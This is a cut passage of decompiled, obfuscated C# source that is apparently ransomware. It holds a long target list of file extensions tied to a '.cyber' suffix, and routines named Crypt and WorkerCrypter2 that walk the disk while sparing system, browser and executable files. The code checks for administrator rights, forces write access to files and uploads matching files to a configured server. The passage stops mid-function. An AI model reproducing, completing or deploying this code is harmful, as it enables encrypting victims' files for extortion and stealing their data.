				"npf", "npl", "npp", "npr", "nps", "npt", "npy", "nrb", "nrbak", "nrc",
				"nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib", "nrs", "nrt", "nru",
				"nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsf", "nsg", "nsh", "nsq",
				"nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx", "NU2", "number",
				"numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl", "nvl", "nvm",
				"nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo", "nwp", "nws",
				"nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3", "oab", "oad",
				"oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt", "obx", "obz",
				"occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc", "odccubefile", "odf",
				"odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods", "odt", "odt#",
				"odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui", "ofm", "ofn",
				"oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu", "ogs", "oil",
				"ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event", "olk14group", "olk14note",
				"olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg", "omlog", "omp",
				"onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos", "oot", "op",
				"op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju", "oplx", "opn",
				"opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5", "or6", "ora",
				"orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd", "osdx", "ost",
				"osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl", "otln", "otn",
				"otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd", "ovf", "ovolog",
				"ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01", "p10", "p12",
				"p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c", "p7x", "p7z",
				"p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef", "pak", "pan",
				"paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf", "pbix", "pbj",
				"PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap", "pcapng", "pcb",
				"pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS", "pct", "pcv",
				"pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr", "pdd", "pdf",
				"pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl", "pdfua", "pdfvt",
				"pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp", "pds", "pdw",
				"pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes", "pex", "pez",
				"pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx", "pg", "pgd",
				"pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih", "pixexp", "pj2",
				"pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey", "pkg", "pkh",
				"pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc", "pld", "pli",
				"pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3", "pm4", "pm5",
				"pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo", "pmr", "pmt",
				"pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC", "pod", "poi",
				"pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp", "pp2", "pp3",
				"ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps", "ppsenx", "ppsm",
				"ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt", "pptx", "ppws",
				"ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2", "prj", "prn",
				"pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd", "pro5pl", "pro5plx",
				"pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs", "prt", "prtc",
				"prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3", "psb", "psd",
				"PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm", "PSM1", "psmd",
				"pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx", "psz", "pt3",
				"pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2", "pts", "ptx",
				"PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz", "pvd", "pve",
				"pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf", "pwi", "pwm",
				"pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp", "py", "pys",
				"pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb", "qb2005", "qb2006",
				"qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015", "qb2016", "qb2017",
				"qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb", "qbmd", "qbr",
				"qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct", "qdat", "qdb",
				"qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel", "qf", "qfilter",
				"qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif", "qlgenerator", "qm",
				"qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx", "qrp", "qrt",
				"qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw", "QUE", "quiz",
				"quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt", "qxb", "qxd",
				"qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03", "r0f", "r0z",
				"r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap", "rar", "RAT",
				"ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk", "rbs", "rbt",
				"rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd", "rd1", "rda",
				"rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx", "rdo", "rdoc",
				"rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref", "reference", "rel",
				"rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW", "ret", "rev",
				"rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb", "rgmc", "rgn",
				"rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl", "rlf", "rll",
				"rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx", "rna", "rng",
				"rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx", "rodz", "rofl",
				"rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox", "roxio", "roz",
				"rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres", "rpt", "rptr",
				"rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc", "rsd", "rsdf",
				"rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv", "rsw", "rt",
				"rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk", "rtp", "rtpi",
				"rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel", "rum", "run",
				"rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg", "rwl", "rwlibrary",
				"rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn", "sa5", "sa7",
				"sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam", "sar", "sas7bdat",
				"sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn", "sbo", "sbpf",
				"sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4", "sc45", "sca",
				"scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs", "sch", "SCHEMA",
				"scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs", "scspack", "scssc",
				"sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda", "sdb", "sdc",
				"sdd", "sddraft", "sdf", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo", "sdoc",
				"sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1", "SEARCH-MS",
				"secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server", "ses",
				"set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi", "sgl",
				"sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP", "shr",
				"shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn", "sidx",
				"sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky", "sla",
				"sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp", "slt",
				"slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi", "smlx",
				"smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2", "sna",
				"snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt", "snx",
				"so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg", "spj",
				"spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz", "sps",
				"spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql", "sqlite",
				"sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM", "SRD-WAL",
				"srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd", "ssh",
				"ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5", "st6",
				"st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti", "stk",
				"stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt", "stu",
				"stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf", "sum",
				"surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm", "svn",
				"svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch", "swk",
				"swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm", "sxml",
				"sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05", "t06",
				"t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15", "t16",
				"t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64", "t80",
				"ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab", "tabula-doc",
				"tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS", "tax",
				"tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17", "tax2008",
				"tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017", "tax2018",
				"tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx", "tbz2",
				"tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0", "tda",
				"TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr", "tdt",
				"te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter", "terrn",
				"terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa", "tfd",
				"tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz", "THA",
				"thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff", "tig",
				"time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld", "tlg",
				"tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME", "tml",
				"tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns", "tnsp",
				"toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb", "totalslayout",
				"tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu", "tpx",
				"tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk", "trm",
				"trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr", "tst",
				"tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17", "tt18",
				"tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt", "tu",
				"tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh", "twm",
				"tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm", "txn",
				"txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax", "ubj",
				"ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb", "udf",
				"udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr", "ulf",
				"uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d", "unr",
				"UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk", "upoi",
				"upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr", "ustar",
				"usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm", "uts",
				"utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf", "uxx",
				"v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd", "vbk",
				"vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4", "vc6",
				"vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd", "vcs",
				"vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx", "vec",
				"VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi", "vibe",
				"view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx", "vmdk",
				"vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx", "vmxf",
				"vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd", "vpk",
				"vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp", "vs",
				"vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm", "vssx",
				"vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud", "vvf",
				"vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02", "W2B",
				"w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w", "w8bn",
				"w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav", "wave",
				"waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi", "wbk",
				"wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp", "wcst",
				"wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl", "wdn",
				"wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep", "WER",
				"wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil", "wim",
				"win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3", "wk4",
				"wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll", "wls",
				"wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga", "wmk",
				"wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn", "wnk",
				"wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42", "wp5",
				"wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0", "wpd1",
				"wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps", "wpt",
				"wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2", "ws3",
				"ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh", "wsi",
				"wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp", "wtp",
				"wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx", "WWD",
				"wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn", "wzs",
				"x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML", "xamlx",
				"xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl", "xbt",
				"xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo", "xdoc",
				"xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf", "xfi",
				"xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml", "xgmml",
				"xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf", "xl",
				"xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff", "xline",
				"xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse", "xlshtml",
				"xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx", "xlv",
				"xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf", "xmi",
				"xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms", "xmt_bin",
				"xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj", "xpll",
				"xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx", "xrb",
				"xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl", "xslt",
				"xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps", "xtrl",
				"xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid", "xvl",
				"xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe", "xxx",
				"xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra", "ychat",
				"yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm", "yrcdat",
				"yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct", "ZFSENDTOTARGET",
				"zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps", "ztmp",
				"ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG", "DB",
				"BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP", "BAC",
				"AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS", "ZIP",
				"RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX", "DOC",
				"DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC", "ACCDE",
				"ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF", "ASK",
				"BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12", "CRYPT8",
				"CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL", "DBCRYPT12",
				"DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB", "DCT",
				"DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL", "ECO",
				"ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC", "FMP",
				"FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM", "GDB",
				"GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB", "ITW",
				"JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF", "MAQ",
				"MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD", "MWB",
				"MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV", "NV2",
				"NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96", "P97",
				"PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD", "ROD",
				"ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB", "SDB",
				"SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB", "TE",
				"TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL", "USR",
				"V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD", "XMLFF",
				"vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd", "qb2005",
				"qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw", "qbx",
				"qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10", "tax11",
				"tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt", "3ME",
				"3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009", "QB2010",
				"QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX", "QPB",
				"QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010", "TAX2011",
				"TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA", "AVHD",
				"AVHDX", "OVA"
			}, ".cyber", new string[0], eddVxanYaxlAWs);
		}
	}

	[CompilerGenerated]
	private sealed class eplEdEtHSM
	{
		private sealed class HDLwQGHjFYx
		{
			public eplEdEtHSM xkkZdQkjpuJm;

			public string jLFbqirBFBIdS;

			public void _003CCrypt_003Eb__2f()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					FhRtjohbGZtJz(WindowsIdentity.GetCurrent().Name, jLFbqirBFBIdS);
				}
			}

			public void _003CCrypt_003Eb__30()
			{
				BrtReKfhDC(jLFbqirBFBIdS, xkkZdQkjpuJm.yvkHVEfLzRoNIf, xkkZdQkjpuJm.KNDDqxjwJpjN, xkkZdQkjpuJm.TtGVrIkgBwTpyQm, xkkZdQkjpuJm.aLXvVeesQDQSBuie);
			}
		}

		public string[] yvkHVEfLzRoNIf;

		public string[] TtGVrIkgBwTpyQm;

		public string aLXvVeesQDQSBuie;

		public string KNDDqxjwJpjN;

		public void _003CCrypt_003Eb__2e(string t)
		{
			if (efRXIEwEUukcfR && !woXXmqCRhpoJW().Contains("XP") && !woXXmqCRhpoJW().Contains("Windows 7"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						FhRtjohbGZtJz(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (KlQaUienKdBo == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					BrtReKfhDC(t, yvkHVEfLzRoNIf, KNDDqxjwJpjN, TtGVrIkgBwTpyQm, aLXvVeesQDQSBuie);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				BrtReKfhDC(t, yvkHVEfLzRoNIf, KNDDqxjwJpjN, TtGVrIkgBwTpyQm, aLXvVeesQDQSBuie);
			}
		}
	}

	[CompilerGenerated]
	private sealed class jSquFFNoKMWV
	{
		private sealed class nBxWmiRjuM
		{
			public jSquFFNoKMWV DwoBRercFpGzO;

			public string RYBnEKAqHJtC;

			public void _003CWorkerCrypter2_003Eb__3d()
			{
				foreach (string item in DqnvzCWPBFOfV)
				{
					if (RYBnEKAqHJtC.ToLower().EndsWith(item + DwoBRercFpGzO.JuQZsOpwLv) && gfooytrIBEuhQ == "YES")
					{
						if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > new FileInfo(RYBnEKAqHJtC).Length)
						{
							try
							{
								dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", RYBnEKAqHJtC);
							}
							catch
							{
							}
						}
					}
					else if (RYBnEKAqHJtC.ToLower().EndsWith(item) && gfooytrIBEuhQ == "NO")
					{
						try
						{
							dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", RYBnEKAqHJtC);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class kYFxHNAUqOTq
		{
			public jSquFFNoKMWV DwoBRercFpGzO;

			public string nhZUQSODyQqviUR;

			public void _003CWorkerCrypter2_003Eb__3f()
			{
				foreach (string item in DqnvzCWPBFOfV)
				{
					if (nhZUQSODyQqviUR.ToLower().EndsWith(item + DwoBRercFpGzO.JuQZsOpwLv) && gfooytrIBEuhQ == "YES")
					{
						if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > new FileInfo(nhZUQSODyQqviUR).Length)
						{
							try
							{
								dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", nhZUQSODyQqviUR);
							}
							catch
							{
							}
						}
					}
					else if (nhZUQSODyQqviUR.ToLower().EndsWith(item) && gfooytrIBEuhQ == "NO")
					{
						try
						{
							dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", nhZUQSODyQqviUR);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> LODlxdahcYJ;

		public List<string> eEnQHOfToOQYn;

		public string JuQZsOpwLv;

		public string[] KbohVtOfIVDaJO;

		public string eddVxanYaxlAWs;

		public void _003CWorkerCrypter2_003Eb__3c(string t1)
		{
			string RYBnEKAqHJtC;
			foreach (string item in eEnQHOfToOQYn)
			{
				if (item.Contains("C:\\Program Files\\") || item.Contains("C:\\Program Files (x86)\\") || item.Contains(":\\Windows\\") || item.ToLower().Contains("perflogs") || item.ToLower().Contains("internet explorer") || item.Contains(":\\ProgramData\\") || item.Contains("\\AppData\\") || item.ToLower().Contains("msocache") || item.ToLower().Contains("system volume information") || item.ToLower().Contains("boot") || item.ToLower().Contains("tor browser") || item.ToLower().Contains("mozilla") || item.ToLower().Contains("google chrome") || item.ToLower().Contains("application data") || item.Contains("autoexec.bat") || item.Contains("desktop.ini") || item.Contains("autorun.inf") || item.Contains("ntuser.dat") || item.Contains("NTUSER.DAT") || item.Contains("iconcache.db") || item.Contains("bootsect.bak") || item.Contains("boot.ini") || item.Contains("ntuser.dat.log") || item.Contains("thumbs.db") || item.ToLower().Contains("bootmgr") || item.ToLower().Contains("pagefile.sys") || item.ToLower().Contains("config.sys") || item.ToLower().Contains("ntuser.ini") || item.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) || item.Contains("RSAKeys") || item.Contains("Config.enc") || item.Contains("Инструкция") || item.EndsWith(JuQZsOpwLv) || item.EndsWith("exe") || item.EndsWith("dll") || item.EndsWith("EXE") || item.EndsWith("DLL") || item.Contains("Recycle.Bin") || item.Contains(jMMJJGmjJwKTlH) || item.Contains(HXSuIBiFjcFlYv) || item.Contains(QHZTFDubwp))
				{
					continue;
				}
				if (KbohVtOfIVDaJO.Length != 0)
				{
					string[] kbohVtOfIVDaJO = KbohVtOfIVDaJO;
					int num = 0;
					while (num < kbohVtOfIVDaJO.Length)
					{
						string value = kbohVtOfIVDaJO[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0b81;
					}
				}
				try
				{
					if (item.EndsWith(JuQZsOpwLv))
					{
						goto IL_0b81;
					}
				}
				catch (Exception)
				{
					goto IL_0b81;
				}
				if (!item.EndsWith(t1) || snFJjGniiHtdTSH.Contains(item))
				{
					continue;
				}
				if (LDVZsbBiyOrU == "YES")
				{
					try
					{
						if (MYiVoJiDPuw.iXUrCyWwbDDP(item))
						{
							MYiVoJiDPuw.jBdsvnmIaKEzR(item);
						}
					}
					catch
					{
					}
				}
				snFJjGniiHtdTSH.Add(item);
				if (!UYClCmRdPD.Contains(Path.GetDirectoryName(item)))
				{
					UYClCmRdPD.Add(Path.GetDirectoryName(item));
				}
				CRHPenLGYTyWUT(item);
				try
				{
					new utrmZEFXTZjn().MXDXNXSoXoRHAN(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (MFBaFacYIYTeS)
							{
								Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
